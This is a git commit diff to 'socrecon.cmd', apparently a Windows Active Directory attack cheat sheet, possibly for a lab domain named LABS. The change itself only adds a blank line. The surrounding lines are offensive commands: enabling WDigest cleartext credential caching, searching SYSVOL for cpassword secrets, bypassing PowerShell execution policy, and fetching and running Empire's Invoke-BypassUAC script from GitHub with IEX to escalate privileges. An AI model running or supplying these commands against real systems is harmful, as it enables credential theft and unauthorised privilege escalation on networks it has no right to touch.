99ae2584c18ba308f0c6cb189f6394a82a33ded8
rev10d <31927659+rev10d@users.noreply.github.com>
2021-01-13 09:16:30 -0700

    Update socrecon.cmd

--- socrecon.cmd
+++ socrecon.cmd
@@ -18,6 +18,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLog
 findstr /S cpassword $env:logonserver\sysvol\*.xml
 findstr /S cpassword %logonserver%\sysvol\*.xml
 runas /user:LABS\itadmin /noprofile powershell.exe
+
 powershell -ep bypass
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
 Invoke-BypassUAC -Command 'start powershell.exe'
